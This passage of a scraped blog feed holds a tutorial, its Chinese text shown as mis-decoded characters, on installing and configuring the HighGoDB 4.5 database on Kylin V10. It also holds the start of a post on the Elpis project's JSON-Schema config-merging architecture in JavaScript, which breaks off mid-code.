tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. ç¯å¢ƒå‡†å¤‡</h2>
<p>æ“ä½œç³»ç»Ÿï¼šé“¶æ²³éº’éºŸ V10
æ•°æ®åº“ç‰ˆæœ¬ï¼šHighGoDB 4.5ï¼ˆç€šé«˜æ•°æ®åº“ï¼Œå…¼å®¹ PostgreSQLï¼‰
å®‰è£…æ–‡ä»¶ï¼šhgdb-4.5-e94b212-20250227.x86_64.rpm
å°†å®‰è£…åŒ…ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼ˆæœ¬æ–‡ç›®å½•ï¼š/homeï¼‰ã€‚</p>
<h2 data-id="heading-1">2. å®‰è£…æ•°æ®åº“</h2>
<p>è¿›å…¥å®‰è£…åŒ…ç›®å½•ï¼Œæ‰§è¡Œå®‰è£…å‘½ä»¤,å®‰è£…å®Œæˆåï¼Œä¼šè‡ªåŠ¨åœ¨ systemd ä¸­æ³¨å†ŒæœåŠ¡ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">[root@localhost home]<span class="hljs-comment"># rpm -ivh hgdb-4.5-e94b212-20250227.x86_64.rpm </span>
Verifying...                          <span class="hljs-comment">################################# [100%]</span>
å‡†å¤‡ä¸­...                          <span class="hljs-comment">################################# [100%]</span>
æ­£åœ¨å‡çº§/å®‰è£…...
   <span class="hljs-number">1</span>:hgdb-<span class="hljs-number">4.5</span>-e94b212                 <span class="hljs-comment">################################# [100%]</span>
Created <span class="hljs-keyword">symlink</span> /etc/systemd/<span class="hljs-keyword">system</span>/multi-user.target.wants/hgdb-<span class="hljs-number">4.5</span>.service â†’ /usr/lib/systemd/<span class="hljs-keyword">system</span>/hgdb-<span class="hljs-number">4.5</span>.service.
Created <span class="hljs-keyword">symlink</span> /etc/systemd/<span class="hljs-keyword">system</span>/graphical.target.wants/hgdb-<span class="hljs-number">4.5</span>.service â†’ /usr/lib/systemd/<span class="hljs-keyword">system</span>/hgdb-<span class="hljs-number">4.5</span>.service.
</code></pre>
<p>UOS Server 20å®‰è£…å‘½ä»¤ï¼š<code>yum install hgdb-4.5-29a3ba5-20250619.x86_64.rpm</code></p>
<p>é»˜è®¤å®‰è£…ç›®å½•ä¸ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/opt/highgo/hgdb-4.5/
</code></pre>
<h2 data-id="heading-2">3. åˆå§‹åŒ–æ•°æ®åº“</h2>
<p>è¿›å…¥ <code>bin</code> ç›®å½•ï¼Œæ‰§è¡Œåˆå§‹åŒ–å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@localhost</span> <span class="hljs-operator">~</span>]# cd <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>bin
[root<span class="hljs-variable">@localhost</span> bin]# .<span class="hljs-operator">/</span>initdb <span class="hljs-operator">-</span>D ..<span class="hljs-operator">/</span>data <span class="hljs-operator">-</span>A scram<span class="hljs-operator">-</span>sha<span class="hljs-number">-256</span> <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>initdb.log
initdb: could <span class="hljs-keyword">not</span> find suitable text <span class="hljs-keyword">search</span> configuration <span class="hljs-keyword">for</span> locale "zh_CN.UTF-8"
Enter <span class="hljs-keyword">new</span> sysdba password: 
å†è¾“å…¥ä¸€é: 
Enter <span class="hljs-keyword">new</span> syssao password: 
å†è¾“å…¥ä¸€é: 
Enter <span class="hljs-keyword">new</span> syssso password: 
å†è¾“å…¥ä¸€é: 
<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15.770</span> CST [<span class="hljs-number">16233</span>] æ—¥å¿—:  Switchover the SSHA Role. <span class="hljs-keyword">Current</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NONE</span>
<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15.839</span> CST [<span class="hljs-number">16235</span>] æ—¥å¿—:  Switchover the SSHA Role. <span class="hljs-keyword">Current</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NONE</span>
</code></pre>
<p>åˆå§‹åŒ–æ—¶ä¼šè¦æ±‚è®¾ç½® ä¸‰ç±»ç”¨æˆ·å¯†ç ï¼š</p>
<ul>
<li>sysdbaï¼ˆç³»ç»Ÿç®¡ç†å‘˜ï¼‰</li>
<li>syssaoï¼ˆå®‰å…¨ä¿å¯†ç®¡ç†å‘˜ï¼‰</li>
<li>sysssoï¼ˆå®‰å…¨å®¡è®¡å‘˜ï¼‰
å®Œæˆåæ‰§è¡Œ SSL è¯ä¹¦ç”Ÿæˆï¼š</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@localhost bin</span>]<span class="hljs-meta"># ./hg_sslkeygen.sh /opt/highgo/hgdb-4.5/data</span>
Setting the ssl configuration to /opt/highgo/hgdb<span class="hljs-number">-4.5</span>/data
Generating RSA <span class="hljs-keyword">private</span> key, <span class="hljs-number">2048</span> <span class="hljs-function">bit <span class="hljs-built_in">long</span> <span class="hljs-title">modulus</span> (<span class="hljs-params"><span class="hljs-number">2</span> primes</span>)
................................................................+++++
...+++++
e <span class="hljs-keyword">is</span> 65537 (<span class="hljs-params"><span class="hljs-number">0x010001</span></span>)
</span></code></pre>
<h2 data-id="heading-3">4. é…ç½®ç¯å¢ƒå˜é‡</h2>
<p>è¿›å…¥ etc ç›®å½•ï¼Œæ‹·è´ç¯å¢ƒå˜é‡æ¨¡æ¿ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@localhost bin</span>]<span class="hljs-meta"># cd /opt/highgo/hgdb-4.5/etc</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># cp hgdbenv.sample hgdb.env</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># vim hgdb.env 		# æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># source hgdb.env		# åŠ è½½ç¯å¢ƒå˜é‡</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># echo $HGDB_HOME		# æµ‹è¯•ç¯å¢ƒå˜é‡</span>
</code></pre>
<h2 data-id="heading-4">5ã€é…ç½®IPè®¿é—®</h2>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@localhost</span> etc]# systemctl <span class="hljs-keyword">start</span> hgdb<span class="hljs-number">-4.5</span>.service		# å¯åŠ¨æœåŠ¡
[root<span class="hljs-variable">@localhost</span> etc]# psql <span class="hljs-operator">-</span>d highgo <span class="hljs-operator">-</span>U sysdba				# è¿æ¥æ•°æ®åº“
ç”¨æˆ· sysdba çš„å£ä»¤ï¼š
æ³¨æ„:  
<span class="hljs-comment">-------------------------------------------</span>
Login <span class="hljs-keyword">User</span>: sysdba 
Login <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">10</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31.795855</span><span class="hljs-operator">+</span><span class="hljs-number">08</span> 
Login Address: [<span class="hljs-keyword">local</span>] 
<span class="hljs-keyword">Last</span> Login Status: SUCCESS 
Login Failures: <span class="hljs-number">0</span> 
Valied Until: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-27</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><span class="hljs-operator">+</span><span class="hljs-number">08</span> 
<span class="hljs-comment">-------------------------------------------</span>

psql (<span class="hljs-number">4.5</span>)
è¾“å…¥ "help" æ¥è·å–å¸®åŠ©ä¿¡æ¯.

highgo<span class="hljs-operator">=</span># <span class="hljs-keyword">show</span> listen_addresses;			# æŸ¥çœ‹ç›‘å¬åœ°å€
 listen_addresses 
<span class="hljs-comment">------------------</span>
 localhost
(<span class="hljs-number">1</span> è¡Œè®°å½•)

highgo<span class="hljs-operator">=</span># <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> listen_addresses <span class="hljs-operator">=</span> <span class="hljs-string">'*'</span>;	# ä¿®æ”¹ç›‘å¬åœ°å€
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span>
highgo<span class="hljs-operator">=</span># exit;
[root<span class="hljs-variable">@localhost</span> etc]#
[root<span class="hljs-variable">@localhost</span> <span class="hljs-operator">/</span>]# vim <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>pg_hba.conf		# ä¿®æ”¹ pg_hba.conf
# æ–°å¢ä¸€è¡Œï¼Œå…è®¸æ‰€æœ‰ IP è¿æ¥ï¼š
host    <span class="hljs-keyword">all</span>    <span class="hljs-keyword">all</span>    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>    scram<span class="hljs-operator">-</span>sha<span class="hljs-number">-256</span>
</code></pre>
<p>é‡å¯æ•°æ®åº“
<code>systemctl restart hgdb-4.5.service</code></p>
<h2 data-id="heading-5">6. å¼€æ”¾é˜²ç«å¢™ç«¯å£</h2>
<p>ç€šé«˜æ•°æ®åº“é»˜è®¤ç«¯å£æ˜¯ 5866ï¼Œéœ€è¦åœ¨é˜²ç«å¢™æ”¾è¡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ°¸ä¹…æ”¾è¡Œ 5866 ç«¯å£</span>
firewall-cmd <span class="hljs-attr">--zone</span>=public --add-port=<span class="hljs-number">5866</span>/tcp --permanent

<span class="hljs-comment"># é‡æ–°åŠ è½½é˜²ç«å¢™é…ç½®</span>
firewall-cmd --reload

<span class="hljs-comment"># æŸ¥çœ‹ç«¯å£æ˜¯å¦å·²å¼€æ”¾</span>
firewall-cmd <span class="hljs-attr">--zone</span>=public --list-ports
</code></pre>
<h2 data-id="heading-6">7. éªŒè¯è¿œç¨‹è¿æ¥</h2>
<p>åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ psql æˆ– Navicat / DBeaver ç­‰å·¥å…·è¿æ¥ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">host:</span> <span class="hljs-string">æœåŠ¡å™¨IP</span>
<span class="hljs-attr">port:</span> <span class="hljs-number">5866</span>
<span class="hljs-attr">database:</span> <span class="hljs-string">highgo</span>
<span class="hljs-attr">username:</span> <span class="hljs-string">sysdba</span>
<span class="hljs-attr">password:</span> <span class="hljs-string">åˆå§‹åŒ–æ—¶è®¾ç½®çš„å¯†ç </span>
</code></pre>
<h2 data-id="heading-7">8. æ›´æ–°ç€šé«˜æ•°æ®åº“lic</h2>
<pre><code class="hljs language-bash" lang="bash">/opt/highgo/hgdb-4.5/bin/hg_lic -l -P /opt/highgo/hgdb-4.5 -F /opt/highgo/hgdb-4.5/data/hgdb.lic
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elpis ç¬¬ä¸‰é˜¶æ®µÂ· é¢†åŸŸæ¨¡å‹æ¶æ„å»ºè®¾]]></title>    <link>https://juejin.cn/post/7583980250734444607</link>    <guid>https://juejin.cn/post/7583980250734444607</guid>    <pubDate>2025-12-16T05:01:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583980250734444607" data-draft-id="7583912899389554731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elpis ç¬¬ä¸‰é˜¶æ®µÂ· é¢†åŸŸæ¨¡å‹æ¶æ„å»ºè®¾"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-16T05:01:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€å¿µä¹‹é—´lq"/> <meta itemprop="url" content="https://juejin.cn/user/2541726616524583"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elpis ç¬¬ä¸‰é˜¶æ®µÂ· é¢†åŸŸæ¨¡å‹æ¶æ„å»ºè®¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726616524583/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€å¿µä¹‹é—´lq
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:01:37.000Z" title="Tue Dec 16 2025 05:01:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.æ¦‚è¿°</h2>
<p>åœ¨Elpisé¡¹ç›®é¢†åŸŸæ¨¡å‹æ¶æ„ä¸»è¦æ˜¯ä»¥åŸºäº <strong>JSON Schema</strong> çš„ DSLï¼ˆé¢†åŸŸç‰¹å®šè¯­è¨€ï¼‰æ•°æ®é…ç½®é©±åŠ¨é¡µé¢æ¸²æŸ“çš„æ¶æ„ã€‚æˆ‘ä»¬ä»¥ä¸€å¥—æ ‡å‡†é¡¹ç›®æå–å‡ºå…¬å…±çš„<code>Model</code>é…ç½®ç»“åˆå¯å…¨è‡ªå®šä¹‰åŒ–çš„<code>Project</code>é…ç½®ç»§æ‰¿åˆå¹¶æˆç‹¬ç«‹å®Œæ•´é¡¹ç›®çš„<code>JSON Schema</code>é…ç½®æ–‡ä»¶,ç»“åˆ<code>dashboard</code> æ¨¡æ¿å¼•æ“è§£ææœ€ç»ˆç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„ä¸­åå°é¡¹ç›®ã€‚åŸºäºè¿™æ ·çš„<code>DSLé…ç½®åŒ–</code>é¢†åŸŸæ¨¡å‹æ¶æ„ä¸‹å°†80%ä¸šåŠ¡é€»è¾‘æ²‰æ·€,æé«˜å¼€å‘æ•ˆç‡ã€‚</p>
<h2 data-id="heading-1">2.é¢†åŸŸæ¨¡å‹æ¶æ„</h2>
<h3 data-id="heading-2">1.é¢†åŸŸæ¨¡å‹æ¶æ„è®¾è®¡</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b36d22e26ed479d9c30d65652d76fdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5b-15LmL6Ze0bHE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766466449&amp;x-signature=bTiDwSzjBD6WSg0WuBfetw2FGC8%3D" alt="ScreenShot_2025-12-16_090523_054.png" loading="lazy"/></p>
<h3 data-id="heading-3">2.é¢†åŸŸæ¨¡å‹æ¶æ„æµç¨‹</h3>
<h4 data-id="heading-4">1.é¡¹ç›®DSLé…ç½®æ–‡ä»¶ç”Ÿæˆ</h4>
<p>é€šè¿‡<code>Model</code>åŸºç¡€é…ç½®ä¸å„ä¸ª<code>Project</code>ç‹¬ç«‹é¡¹ç›®é…ç½®åˆå¹¶,å½¢æˆå„ä¸ªé¡¹ç›®å®Œæ•´çš„é¡¹ç›®é…ç½®å†…å®¹,å¹¶ä¸”åœ¨<code>BFF Server</code>å±‚æä¾›Api è·å–é…ç½®é¡¹ä¾›ç»™å‰ç«¯ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">//`Model`åŸºç¡€é…ç½®ä¸å„ä¸ª`Project`ç‹¬ç«‹é¡¹ç›®é…ç½®åˆå¹¶ç»§æ‰¿</span>
<span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);

<span class="hljs-comment">// project ç»§æ‰¿ model</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">projectExtendModel</span> = (<span class="hljs-params">model, project</span>) =&gt; {
    <span class="hljs-keyword">return</span> _.<span class="hljs-title function_">mergeWith</span>({}, model, project, <span class="hljs-function">(<span class="hljs-params">modelValue, projValue</span>) =&gt;</span> {
        <span class="hljs-comment">//å¤„ç†æ•°ç»„åˆå¹¶çš„ç‰¹æ®Šæƒ…å†µ</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(modelValue) &amp;&amp; <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(projValue)) {
            <span class="hljs-keyword">let</span> result = []

            <span class="hljs-comment">//å› ä¸º project ç»§æ‰¿model,æ‰€ä»¥éœ€è¦ä¿®æ”¹å’Œæ–°å¢å†…å®¹çš„æƒ…å†µ</span>
            <span class="hljs-comment">//project æœ‰çš„é”®å€¼,modelä¹Ÿæœ‰ =&gt; ä¿®æ”¹(é‡è½½)</span>
            <span class="hljs-comment">//project æœ‰çš„é”®å€¼,modelæ²¡æœ‰ =&gt; æ–°å¢ æ‹“å±•)</span>
            <span class="hljs-comment">//model æœ‰çš„é”®å€¼,projectæ²¡æœ‰ =&gt; ä¿ç•™(ç»§æ‰¿)</span>

            <span class="hljs-comment">//å¤„ç†ä¿®æ”¹å’Œä¿ç•™</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; modelValue.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">let</span> modelItem = modelValue[i]
                <span class="hljs-keyword">const</span> projItem = projValue.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">projItem</span> =&gt;</span> projItem.<span class="hljs-property">key</span> === modelItem.<span class="hljs-property">key</span>)
                <span class="hljs-comment">// projectæœ‰çš„é”®å€¼,modelä¹Ÿæœ‰,åˆ™é€’å½’è°ƒç”¨ projectExtendModel æ–¹æ³•è¦†ç›–ä¿®æ”¹</span>
                result.<span class="hljs-title function_">push</span>(projItem ? <span class="hljs-title function_">projectExtendModel</span>(modelItem, projItem) : modelItem)
            }
            <span class="hljs-comment">//å¤„ç†æ–°å¢</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; projValue.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">let</span> projItem = projValue[i]
